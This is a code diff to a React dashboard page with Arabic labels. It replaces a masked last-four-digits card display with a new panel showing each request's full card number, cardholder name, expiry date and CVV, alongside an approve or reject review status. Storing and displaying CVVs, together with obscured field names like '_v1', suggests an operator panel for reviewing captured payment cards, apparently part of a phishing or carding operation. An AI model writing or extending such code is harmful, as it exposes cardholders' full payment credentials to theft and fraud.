@@ -833,8 +833,27 @@ export default function DashboardPage() {
                       { label: "نوع البطاقة", value: selectedRequest.raw?.cardType },
                       { label: "البنك", value: selectedRequest.raw?.bankInfo?.name },
                       { label: "بلد البنك", value: selectedRequest.raw?.bankInfo?.country },
-                      { label: "رقم البطاقة", value: selectedRequest.raw?._v1 ? '•••• ' + String(selectedRequest.raw._v1).slice(-4) : selectedRequest.raw?.cardNumber },
-                      { label: "تاريخ الانتهاء", value: selectedRequest.raw?._v4 },
+                    ].map(
+                      (item) =>
+                        item.value && (
+                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
+                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
+                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
+                          </div>
+                        )
+                    )}
+                  </div>
+                </div>
+
+                {/* Card Details */}
+                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
+                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تفاصيل البطاقة</h3>
+                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+                    {[
+                      { label: "رقم البطاقة", value: selectedRequest.raw?.cardNumber },
+                      { label: "اسم حامل البطاقة", value: selectedRequest.raw?.cardOwner },
+                      { label: "تاريخ الانتهاء", value: selectedRequest.raw?.cardExpiry },
+                      { label: "رمز الأمان (CVV)", value: selectedRequest.raw?.cvv },
                       { label: "الحالة", value: getPaymentStatus() === 'approved' ? '✅ مقبولة' : getPaymentStatus() === 'rejected' ? '❌ مرفوضة' : '⏳ بانتظار المراجعة' },
                     ].map(
                       (item) =>
